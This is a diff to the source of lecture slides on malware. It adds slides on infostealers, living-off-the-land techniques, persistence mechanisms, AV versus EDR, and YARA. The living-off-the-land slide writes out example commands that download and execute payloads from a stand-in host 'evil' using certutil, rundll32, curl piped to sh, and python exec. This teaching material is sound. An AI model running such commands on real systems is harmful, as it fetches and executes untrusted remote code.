@@ -94,7 +94,8 @@ piece of software is not automatically malware — it's a (bad) software quality
 - Stealth & evasion ability
 - Persistence
 - Command-ability / automatic triggers
-- Polymorphism (self-modifying code)
+- Polymorphism malware (mutates the encryption)
+- Metamorphic malware (self-modifying code)
 
 </v-clicks>
 
@@ -224,7 +225,7 @@ layout: two-cols
 # Popular worms (1)
 
 - **Morris (1988)** — 1st wild worm
-  - used sendmail vulnerability
+  - used sendmail debug mode vulnerability, stack buffer overflow and weak password dictionary attack
 - **Code Red (2001)** — MS IIS vulnerability
   - defaced websites, minor
 - **Blaster / Lovesan (2003)**
@@ -323,6 +324,32 @@ layout: two-cols
 </div>
 
 ---
+layout: two-cols
+class: cols-55-45
+---
+
+# Infostealers
+
+**The #1 commodity malware today** — "hit and run" (no persistence needed!)
+
+- **Targets:**
+  - Browser SQLite DBs + OS decryption keys (Windows **DPAPI** / macOS Keychain)
+  - **Session cookies & OAuth tokens** → bypasses MFA!
+  - Crypto wallets, password managers, SSH / AWS keys, Discord / Telegram tokens
+- **Workflow:** execute → harvest in seconds → send `.zip` to C2 (Telegram bot / HTTP) → self-delete
+- ** MaaS (Malware-as-a-Service):** $100–$300/month (*Lumma*, *RedLine*, *Vidar*, *Raccoon*, *Stealc*)
+
+::right::
+
+**Why ransomware loves stealers:**
+
+1. Victim runs cracked tool / fake CAPTCHA
+2. Lumma Stealer grabs Chrome session + VPN creds
+3. "Log" sold on darknet market ($10–$50)
+4. Initial Access Broker / Ransomware affiliate
+   logs right into corporate VPN — no exploit!
+
+---
 
 # Backdoors / Supply chain
 
@@ -334,7 +361,7 @@ layout: two-cols
   - `xz` library compile-time auth. bypass for OpenSSH server
   - NIST Dual EC DRBG crypto RNG by NSA (speculated)
   - Master passwords in Cisco & Juniper routers/firewalls
-  - Numerous NPM / Python packages, PC/Android/iOS apps (e.g., VLC) etc.
+  - Numerous NPM / Python packages, PC/Android/iOS apps (e.g., Notepad++) etc.
 
 ---
 layout: section
@@ -371,7 +398,7 @@ class: exec-conceal
 
 **Kernel mode:**
 
-- Kernel modules (run with SYSTEM privileges / modprobe)
+- Kernel modules (run in Ring 0, bypassing user-space checks)
 - System call table patching
 
 **Other:**
@@ -389,6 +416,56 @@ class: exec-conceal
 .exec-conceal.col-left p,
 .exec-conceal.col-left li { font-size: 0.88em; }
 </style>
+
+---
+
+# Living off the Land (LotL)
+
+Why drop a custom `.exe` when the OS already ships signed tools?
+
+- **Goals:** download payloads, execute code in memory (**fileless**), dump credentials, bypass AppLocker / AV file signatures
+- Abuse legitimate, **vendor-signed** system binaries:
+  - Windows: **LOLBins** ([lolbas-project.github.io](https://lolbas-project.github.io))
+
+certutil.exe -urlcache -split -f http://evil/p.dll p.dll
+
+rundll32.exe p.dll,EntryPoint
+
+  - Linux/Unix: **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io))
+
+
+curl -fsSL http://evil/bot.sh | sh
+
+python3 -c 'import urllib.request as u; exec(u.urlopen("...").read())'
+
+---
+layout: two-cols
+class: cols-50-50
+---
+
+# Persistence: Windows vs. Linux
+
+**Windows**
+- **Registry Run keys** (`HKCU\...\CurrentVersion\Run`)
+  - *RedLine, TrickBot, AsyncRAT*
+- **Scheduled Tasks & Services** (`schtasks`, `sc.exe`)
+  - *QakBot, WannaCry*
+- **DLL Side-Loading** (drop malicious DLL next to clean signed `.exe`)
+  - *PlugX / Mustang Panda*
+- **WMI Event Subscriptions** (fileless, runs as `SYSTEM`)
+  - *APT29 (Cozy Bear), NotPetya*
+
+::right::
+
+**Linux**
+- **`cron` jobs & `systemd` units** (`/etc/crontab`, `/etc/systemd/system/*.service`)
+  - *Kinsing, XorDDoS*
+- **Shell & SSH configs** (`~/.bashrc`, `~/.ssh/authorized_keys`)
+  - *Cloud cryptominers, SSH worms*
+- **Dynamic linker hijacking** (`/etc/ld.so.preload`, `LD_PRELOAD`)
+  - *Symbiote, Jynx userland rootkit*
+- **Loadable Kernel Modules** (`/etc/modules-load.d/`)
+  - *Diamorphine, Reptile*
 
 ---
 layout: two-cols
@@ -423,7 +500,7 @@ class: cols-60-40
 
 # Ransomware
 
-- Usually worms; delete / steal / encrypt files
+- Delete / steal / encrypt files
 - Advanced: asymmetric ciphers, timed triggers etc.
 - CryptoLocker (2013), WannaCry (2017), Petya
 - Ransomware as a Service (e.g., REvil, Hive)
@@ -514,6 +591,27 @@ class: cols-65-45
 - **Linux rootkit detectors:** chkrootkit, rkhunter, LMD
 
 ---
+
+# Classic Antivirus vs. Modern EDR
+
+**EDR (Endpoint Detection & Response)** shifts from *blocking known files* to *recording & correlating behavior*:
+
+| Dimension | Classic Antivirus (AV) | Modern EDR |
+|-----------|------------------------|--------------------------------------------------------------|
+| **Primary check** | Static file hashes, byte signatures, basic heuristics | Continuous behavioral telemetry + process lineage trees |
+| **When it acts** | Pre-execution / on file write (`open` / `write`) | Runtime: process creation, memory alloc, network, scripts |
+| **OS visibility** | File system minifilter | Kernel callbacks, **AMSI** (scripts), `ntdll.dll` hooks, Linux **eBPF** |
+| **Fileless / LotL** | Mostly blind (no malicious file on disk) | Sees `winword.exe → powershell.exe -enc ...`|
+| **Response** | Quarantine / delete file | Isolate host, dump memory, remote live shell, rollback |
+
+- **Attacker counter-moves:** unhooking user-mode `ntdll.dll` via direct/indirect `syscall`s, booting into Safe Mode (*Akira*), or **BYOVD** (*Bring Your Own Vulnerable Driver*) to blind kernel callbacks
+
+<style>
+table { font-size: 0.8em; }
+table td, table th { padding: 0.35em 0.6em; }
+</style>
+
+---
 layout: two-cols
 ---
 
@@ -568,10 +666,21 @@ Takeaway: the security product is privileged attack surface — "AV says OK" is 
 
 ---
 
+# YARA — "grep" for malware
+
+Industry-standard tool to identify and classify malware samples across **files** and **live process memory**:
+
+- Rule anatomy:
+  - **`meta`**: author, threat name, hash, date
+  - **`strings`**: ASCII / wide text, hex patterns (with wildcards `??` & jumps `[4-8]`), regex
+  - **`condition`**: boolean logic, file magic, filesize, PE/ELF imports, **entropy** (packed data!)
+
+---
+
 # Malware analysis
 
 - Quick response → **isolation!**
-- Stealth rootkit? Put RAM into freezer :)
+- Analyses via DMA, VM introspection, crash dumps - Volatility
 - **Sandboxing** — execute the sample inside a virtual machine to study its behavior
   - must make environment undetectable!
   - sometimes: simulate entire network of devices to capture malware before production (honeypots)!
